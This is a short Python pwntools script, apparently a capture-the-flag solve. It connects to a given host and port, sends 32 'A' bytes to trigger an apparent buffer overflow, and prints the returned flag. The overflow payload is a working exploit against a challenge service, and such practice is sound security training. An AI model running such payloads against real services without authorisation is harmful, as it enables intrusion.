from pwn import *
import sys

if len(sys.argv) != 3:
    exit(f'{sys.argv[0]} <host> <port>')

host, port = sys.argv[1:]

with remote(host, int(port)) as p:
    p.sendline(b"A" * 0x20)

    p.recvuntil(b'flag-')
    log.success('flag: flag-' + p.recvline().decode().strip())